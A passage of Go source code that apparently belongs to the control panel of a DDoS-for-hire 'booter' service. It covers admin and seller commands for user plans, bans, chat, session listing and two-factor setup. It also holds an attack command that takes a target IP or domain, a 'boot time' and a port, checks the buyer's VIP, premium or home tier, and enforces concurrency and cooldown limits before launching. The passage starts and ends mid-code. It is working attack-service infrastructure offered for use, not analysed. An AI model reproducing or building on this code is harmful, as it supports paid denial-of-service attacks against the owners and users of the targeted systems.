Cells: []*simpletable.Cell{
{Align: simpletable.AlignCenter, Text: "#"},
{Align: simpletable.AlignCenter, Text: "User"},
{Align: simpletable.AlignCenter, Text: "Seller"},
{Align: simpletable.AlignCenter, Text: "Conns"},
{Align: simpletable.AlignCenter, Text: "Cooldown"},
{Align: simpletable.AlignCenter, Text: "HomeTime"},
{Align: simpletable.AlignCenter, Text: "ExpDate"},
},
}

users, err := database.GetUsers()
if err != nil {
fmt.Println(err)
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "error\r")
continue
}

var sellerusewrs []User
for _, user := range users {
if user.seller == true {
sellerusewrs = append(sellerusewrs, user)
}
}

for _, user := range sellerusewrs {

r := []*simpletable.Cell{
{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
{Text: user.username},
{Text: formatBool(user.seller)},
{Text: fmt.Sprintf("%d", user.concurrents)},
{Text: fmt.Sprintf("%d", user.cooldown)},
{Text: fmt.Sprintf("%d", user.hometime)},
{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
}

table.Body.Cells = append(table.Body.Cells, r)
if i%19 == 0 && i != 0 {
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.03.1.7427 \033[0m\033[1A")

table.Body.Cells = make([][]*simpletable.Cell, 0)

this.conn.Read(make([]byte, 10))
fmt.Fprint(this.conn, "\033c")
}
}

if len(table.Body.Cells) > 0 {
fmt.Fprintf(this.conn, "\033c")
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprint(this.conn, "")
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\r")

}
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "homelist":

if userInfo.seller == true {
goto skipadminauth2dd
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2dd:
table := simpletable.New()
var i = 0
table.Header = &simpletable.Header{
Cells: []*simpletable.Cell{
{Align: simpletable.AlignCenter, Text: "#"},
{Align: simpletable.AlignCenter, Text: "User"},
{Align: simpletable.AlignCenter, Text: "Home"},
{Align: simpletable.AlignCenter, Text: "Conns"},
{Align: simpletable.AlignCenter, Text: "Cooldown"},
{Align: simpletable.AlignCenter, Text: "HomeTime"},
{Align: simpletable.AlignCenter, Text: "ExpDate"},
},
}

users, err := database.GetUsers()
if err != nil {
fmt.Println(err)
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "error\r")
continue
}

var homeeuseras []User
for _, user := range users {
if user.home == true {
homeeuseras = append(homeeuseras, user)
}
}

for _, user := range homeeuseras {

r := []*simpletable.Cell{
{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
{Text: user.username},
{Text: formatBool(user.home)},
{Text: fmt.Sprintf("%d", user.concurrents)},
{Text: fmt.Sprintf("%d", user.cooldown)},
{Text: fmt.Sprintf("%d", user.hometime)},
{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
}

table.Body.Cells = append(table.Body.Cells, r)
if i%19 == 0 && i != 0 {
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.03.1.7427 \033[0m\033[1A")

table.Body.Cells = make([][]*simpletable.Cell, 0)

this.conn.Read(make([]byte, 10))
fmt.Fprint(this.conn, "\033c")
}
}

if len(table.Body.Cells) > 0 {
fmt.Fprintf(this.conn, "\033c")
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprint(this.conn, "")
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\r")

}
continue


//───────────────────────────────────────────────────────────────────────────────────────────────

case "banuser":

if userInfo.seller == true {
goto skipadminauthbanuserpage
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauthbanuserpage:
if len(args) != 3 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: banuser (\033[0;96musername\033[0;97m) (\033[0;96mdays\033[0;97m)\033[0m\r\n"))
continue
}

banblacklist := []string{
"mips",
"mips999",
"mipsv2",
}

if args[1] == username {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;31mError, Your Trying To Ban Your Self.\033[0m\r\n")))
continue
}

for i := range banblacklist {
if strings.ToLower(args[1]) == banblacklist[i] {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;31mUser Is Blacklisted.\033[0m\r\n")))
continue
}
}

days, err := strconv.Atoi(args[2])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;31mMust Be A Number.\033[0m\r\n"))
continue
}

if database.UserTempBan(args[1], time.Now().Add(time.Duration(days)*(time.Hour*24)).Unix()) == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;31mFailed.\033[0;97m\r\n"))
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mUser Banned.\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "unban":

if userInfo.seller == true {
goto skipadminauthunbanuserpage
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauthunbanuserpage:
if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: unban (\033[0;96musername\033[0;97m)\033[0m\r\n"))
continue
}

if database.UserTempBan(args[1], time.Now().Add(time.Duration(0)*(time.Hour*24)).Unix()) == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;31mFailed.\033[0m\r\n"))
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mUser Unbanned.\033[0m\r\n"))
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "chat":

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintf(this.conn, "\033[0;97mType '\033[0;91mexit\033[0;97m' To Leave The Chat.\033[0m\r\n")

sessionMutex.Lock()

for _, s := range sessions {
if s.Chat == true {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintf(s.Conn, "\033[0;97m\r%s Has \033[0;92mJoined\033[0;97m The Chat.\033[0;97m\r\n", username)
fmt.Fprintf(s.Conn, "\033[0;97m⮞\033[38;5;129m ")
}
}

sessionMutex.Unlock()
session.Chat = true

for {
fmt.Fprint(this.conn, "\033[0;97m⮞\033[38;5;129m ")
msg, err := this.ReadLine(false, true)
if err != nil {
return
}

if msg == "exit" {
sessionMutex.Lock()
session.Chat = false
for _, s := range sessions {
if s.Chat == true {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintf(s.Conn, "\033[0;97m\r%s Has \033[0;31mLeft\033[0;97m The Chat.\033[0;97m\r\n", username)
fmt.Fprintf(s.Conn, "\033[0;97m⮞\033[38;5;129m ")
}
}
session.Chat = false
sessionMutex.Unlock()
break
}

sessionMutex.Lock()
for _, s := range sessions {
if s.Chat == true && s.Username != username {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintf(s.Conn, "\r\033[38;5;126m%s\033[0;97m> %s\r\n", username, msg)
fmt.Fprintf(s.Conn, "\033[0;97m⮞\033[38;5;129m ")
}
}

sessionMutex.Unlock()

}
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "sessions":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

table := simpletable.New()

table.Header = &simpletable.Header{
Cells: []*simpletable.Cell{
{Align: simpletable.AlignCenter, Text: "\033[0;97mID"},
{Align: simpletable.AlignCenter, Text: "\033[0;97mUsername"},
{Align: simpletable.AlignCenter, Text: "\033[0;97mIP"},
{Align: simpletable.AlignCenter, Text: "\033[0;97mCreated"},
{Align: simpletable.AlignCenter, Text: "\033[0;97mIdle"},
{Align: simpletable.AlignCenter, Text: "\033[0;97mAdmin"},
{Align: simpletable.AlignCenter, Text: "\033[0;97mMFA"},
},
}

sessionMutex.Lock()
i := 0
for _, s := range sessions {
mfa := (len(database.CheckSessionMFA(s.Username)) > 0)
ip, _, err := net.SplitHostPort(fmt.Sprint(s.Conn.RemoteAddr()))
if err != nil {
ip = fmt.Sprint(s.Conn.RemoteAddr())
}
fmt.Fprint(this.conn, "\033c")
r := []*simpletable.Cell{
{Align: simpletable.AlignLeft, Text: fmt.Sprint(i + 1)},
{Align: simpletable.AlignLeft, Text: s.Username},
{Align: simpletable.AlignLeft, Text: ip},
{Text: fmt.Sprintf("\033[0;93m%.2f Mins\033[0m", time.Since(s.Created).Minutes())},
{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[93m%.2f Mins\033[0m", time.Since(s.LastCommand).Minutes())},
{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[0;97m%s\033[0m", formatBool(database.CheckSessionAdmin(s.Username)))},
{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[0;97m%s\033[0m", formatBool(mfa))},
}
table.Body.Cells = append(table.Body.Cells, r)
i++
}
sessionMutex.Unlock()

table.SetStyle(simpletable.StyleUnicode)
fmt.Fprint(this.conn, strings.Replace("\033[0;97m"+table.String(), "\n", "\r\n", -1))
fmt.Fprint(this.conn, "\r\n")
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────


if args[0] == "setalldays" && len(args) < 2 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: setalldays (\033[0;96mdays\033[0;97m)\033[0m\r\n"))
continue
}

if args[0] == "setalldays" && len(args) > 1 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

days := args[1]
editplanExpire, err := strconv.Atoi(days)
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;31mInvalid ExpDays.\033[0m\r")))
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mConfirm (\033[0;92mYES\033[0;97m/\033[0;31mNO\033[0;97m)\033[0;96m: "))
confirm, err := this.ReadLine(false, true)
if err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\r\n", err)))
}

if confirm != "YES" && confirm != "yes" {
continue
}

if database.setallusersdays(editplanExpire) {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mAdded \033[0;96m"+days+"\033[0;97m Days To All Users.\033[0m\r\n"))
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "setallcons" && len(args) < 2 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: setallcons (\033[0;96mconcurrents\033[0;97m)\033[0m\r\n"))
continue
}

if args[0] == "setallcons" && len(args) > 1 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

days := args[1]
cons, err := strconv.Atoi(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid Concurrents.\033[0m\r\n")
return
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mConfirm (\033[0;92mYES\033[0;97m/\033[0;31mNO\033[0;97m)\033[0;96m: "))
confirm, err := this.ReadLine(false, true)
if err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\r\n", err)))
}

if confirm != "YES" && confirm != "yes" {
continue
}

if database.setalluserscons(cons) {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mAdded \033[0;96m"+days+"\033[0;97m Concurrents To All Users.\033[0m\r\n"))
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "setallcooldown" && len(args) < 2 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: setallcooldown (\033[0;96mcooldown\033[0;97m)\033[0m\r\n"))
continue
}

if args[0] == "setallcooldown" && len(args) > 1 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

days := args[1]
cons, err := strconv.Atoi(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid Cooldown-Time.\033[0m\r\n")
return
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mConfirm (\033[0;92mYES\033[0;97m/\033[0;31mNO\033[0;97m)\033[0;96m: "))
confirm, err := this.ReadLine(false, true)
if err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\r\n", err)))
}

if confirm != "YES" && confirm != "yes" {
continue
}

if database.setalluserscooldown(cons) {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mAdded \033[0;96m"+days+"\033[0;97m Seconds To All Users Cooldowns.\033[0m\r\n"))
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "setallhometime" && len(args) < 2 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: setallhometime (\033[0;96mtime-seconds\033[0;97m)\033[0m\r\n"))
continue
}

if args[0] == "setallhometime" && len(args) > 1 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

days := args[1]
cons, err := strconv.Atoi(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid Home-Time.\033[0m\r\n")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mConfirm (\033[0;92mYES\033[0;97m/\033[0;31mNO\033[0;97m)\033[0;96m: "))
confirm, err := this.ReadLine(false, true)
if err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\r\n", err)))
}

if confirm != "YES" && confirm != "yes" {
continue
}

if database.setallusershometime(cons) {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mAdded \033[0;96m"+days+"\033[0;97m Seconds To All Users Home-Time.\033[0m\r\n"))
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "editcooldown" {

if userInfo.seller == true {
goto skipadminauth2aa
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2aa:
if len(args) < 3 {
this.conn.Write([]byte("\033[0;97mSyntax: editcooldown (\033[0;96musername\033[0;97m) (\033[0;96mcooldown-seconds\033[0;97m)\033[0m\r\n"))
continue
}

user, err := database.GetUser(args[1])
if err != nil {
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

durationcut, err := strconv.Atoi(args[2])
if err != nil {
fmt.Fprintln(this.conn, "\033[0;31mInvalid Cooldown.\033[0m\r\n")
return
}

if database.updatecooldown(user.username, durationcut) == false {
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}
f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " | Updated Cooldown To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}
err = f.Close()
if err != nil {
fmt.Println(err)
return
}

fmt.Fprintln(this.conn, "\033[0;97mUpdated Cooldown.\033[0m\r")
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "edit-days" && len(args) < 2 {

if userInfo.seller == true {
goto skipadminauth2rr
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2rr:
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: edit-days (\033[0;96musername\033[0;97m) (\033[0;96mdays\033[0;97m)\033[0m\r\n"))
continue
}

if args[0] == "edit-days" && len(args) > 2 {

if userInfo.seller == true {
goto skipadminauth3
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth3:
edituser := args[1]
days := args[2]
editplanExpire, err := strconv.Atoi(days)
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;31mInvalid ExpDays.\033[0m\r")))
continue
}

if database.EditDays(edituser, editplanExpire) {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mAdded \033[0;96m"+days+"\033[0;97m Days To \033[0;96m"+edituser+"\033[0;97m's Plan.\033[0m\r\n"))
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────


command := strings.Split(cmd, " ")
switch strings.ToLower(command[0]) {
case "mfa":

if len(userInfo.mfasecret) < 10 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;97mAccept\033[0;97m/\033[0;97mDecline 2FA By Typing (\033[0;97mYES\033[0;97m/\033[0;97mNO)\033[0;96m: ")
confirm, err := this.ReadLine(false, true)
if err != nil {
return
}

confirm = strings.ToLower(confirm)

if confirm != "YES" && confirm != "yes" {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mAborted.\033[0m\r")
continue
}

fmt.Fprint(this.conn, "\033[0;97mEnter Full Screen Mode On Your Putty Terminal.\033[0m\r\n")
time.Sleep(3500 * time.Millisecond)
fmt.Fprint(this.conn, "\033c")
time.Sleep(100 * time.Millisecond)

secret := GenTOTPSecret()

totp := gotp.NewDefaultTOTP(secret)

qr := New()
qrcode := qr.Get("otpauth://totp/" + url.QueryEscape("Dawis") + ":" + url.QueryEscape(username) + "?secret=" + secret + "&issuer=" + url.QueryEscape("Dawis") + "&digits=6&period=30").Sprint()
fmt.Fprintln(this.conn, strings.ReplaceAll(qrcode, "\n", "\r\n"))

fmt.Fprintln(this.conn, "\033[0;97mScan QR Code Or Use The Given Code Below. Recommended App: Twilio Authy\033[0m\r")
fmt.Fprintln(this.conn, "\033[0;97mSecret Code > \033[0;96m"+secret+"\033[0m\r")

fmt.Fprint(this.conn, "\033[0;97m6-Digit Code\033[0;96m: ")
code, err := this.ReadLine(false, true)
if err != nil {
return
}

if totp.Now() != code {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid Code.\033[0m\r")
continue
}

if database.UserToggleMfa(username, secret) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

userInfo.mfasecret = secret

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97m2FA Activated.\033[0m\r")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97m2FA Is Already [\033[0;92mTrue\033[0;97m] On Your Account.\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "mfaoff":

if len(userInfo.mfasecret) > 1 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;97m6-Digit Code\033[0;96m: ")
code, err := this.ReadLine(false, true)
if err != nil {
return
}

totp := gotp.NewDefaultTOTP(userInfo.mfasecret)

if totp.Now() != code {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid Code.\033[0m\r")
continue
}

if database.UserToggleMfa(username, "") == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed\033[0m\r")
continue
}

userInfo.mfasecret = ""
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;92m2FA Removed.\033[0m\r")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97m2FA Is [\033[0;31mFalse\033[0;97m] On Your Account.\033[0m\r")

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if CheckJSONEnabled(args[0]) == true {
if CheckJSONVip(args[0]) == true {
if userInfo.vip == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mYou Need VIP Access To Use This Method\033[0;97m.\033[0m\r\n"))
continue
}
}

if CheckJSONPremium(args[0]) == true {
if userInfo.premium == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mYou Need Premium Access To Use This Method\033[0;97m.\033[0m\r\n"))
continue
}
}

if CheckJSONHome(args[0]) == true {
if userInfo.home == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mYou Need Home Access To Use This Method\033[0;97m.\033[0m\r\n"))
continue
}
}
}

if CheckJSONMethod(args[0]) == true && len(args) < 4 {
if CheckJSONEnabled(args[0]) == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mMethod Is Disabled\033[0;97m.\033[0m\r\n"))
continue

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

} else if CheckJSONEnabled(args[0]) == true {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mDescription: \033[0;4;92m" + CheckJSONDescription(args[0]) + "\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: \033[0;96m" + args[0] + " \033[0;97m(\033[0;96mtarget\033[0;97m) (\033[0;96mtime\033[0;97m) (\033[0;96mport\033[0;97m)\033[0m\r\n"))
continue
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

if CheckJSONMethod(args[0]) == true && len(args) > 3 {
if CheckJSONEnabled(args[0]) == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mMethod Is Disabled\033[0;97m.\033[0m\r\n"))
continue
} else {
if CheckJSONEnabled(args[0]) == true {
if CheckJSONVip(args[0]) == true {
if userInfo.vip == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mYou Need VIP Access To Use This Method\033[0;97m.\033[0m\r\n"))
continue
}
}

if CheckJSONPremium(args[0]) == true {
if userInfo.premium == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mYou Need Premium Access To Use This Method\033[0;97m.\033[0m\r\n"))
continue
}
}

if CheckJSONHome(args[0]) == true {
if userInfo.home == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mYou Need Home Access To Use This Method\033[0;97m.\033[0m\r\n"))
continue
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

var (
AttackDebug = false
)
ipv := args[1]
if IsIPv4(ipv) == true {
goto skipcunt
} else if IsDomain(ipv) == true {
goto skipkunt
} else {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;90mInvalid Target.\033[0m\r")
continue
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

skipcunt:
skipkunt:
timev, err := strconv.Atoi(args[2])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mInvalid Time.\033[0m\r\n"))
continue
}

if CheckJSONPremium(args[0]) == true {
if userInfo.bypasstime == 1 && timev > 120 || userInfo.bypasstime == 0 && timev < 1 {
this.conn.Write([]byte("\033[0;90mInvalid Boot Time\033[0;97m.\033[0m\r\n"))
continue
}
goto skippywhip
}

if CheckJSONVip(args[0]) == true {
if userInfo.bypasstime == 1 && timev > 300 || userInfo.bypasstime == 0 && timev < 1 {
this.conn.Write([]byte("\033[0;90mInvalid Boot Time\033[0;97m.\033[0m\r\n"))
continue
}
goto skippywhip
}

if CheckJSONHome(args[0]) == true {
if userInfo.hometime == 1 && timev > 1200 || userInfo.hometime == 0 && timev < 1 {
this.conn.Write([]byte("\033[0;90mInvalid Boot Time\033[0;97m.\033[0m\r\n"))
continue
}
goto skippywhip
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

skippywhip:
portv, err := strconv.Atoi(args[3])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mInvalid Port.\033[0m\r\n"))
continue
}

if portv > 65535 || portv < 1 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mPort Must Be Between 0 and 65535\033[0m.\r\n"))
continue
}

if timev > 300 || timev < 1 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90mTime Error\033[0m.\r\n"))
continue
}

if userInfo.concurrents == 0 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;90mYou Dont Have Any Concurrents.\033[0m\r")
continue
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ammount, error := database.GetRunningUser(username)
if error != nil {
if AttackDebug {
this.conn.Write([]byte("\033[0m\r\n"))
log.Println("\033[0;90mAttack Failed.\033[0m")
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;90mFailed To Attack This Target.\033[0m\r\n")
return
}

MyRunning, err := database.MyAttacking(username)
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;90mFailed To Attack This Target.\033[0m\r\n")
return
}

if len(MyRunning) != 0 {
if userInfo.concurrents <= Ammount {
if error != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;90mFailed To Attack This Target.\033[0m\r\n")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;90mConcurrent Limit Has Been Reached.\033[0m\r")
continue
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

var recent *Attackv2 = MyRunning[0]

for _, attack := range MyRunning {

if attack.created > recent.created {
recent = attack
continue
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

if recent.created+int64(userInfo.cooldown) > time.Now().Unix() && userInfo.cooldown != 0 {
TimeTesting := time.Unix(recent.created+int64(userInfo.cooldown), 64)
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\r\033[0;97mCooldown Has", fmt.Sprintf("[\033[0;96m%.0f\033[0;97m] Seconds Left\033[0m\r", time.Until(TimeTesting).Seconds()))
if error != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;90mYour Currently In Cooldown.\033[0m\r")
return
}

continue
}

if userInfo.concurrents <= Ammount {
if AttackDebug {
this.conn.Write([]byte("\033[0m\r\n"))
log.Println("" + userInfo.username + "\033[0;90mConcurrent Limit Reached.\033[0m")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

if error != nil {
this.conn.Write([]byte("\033[0m\r\n"))
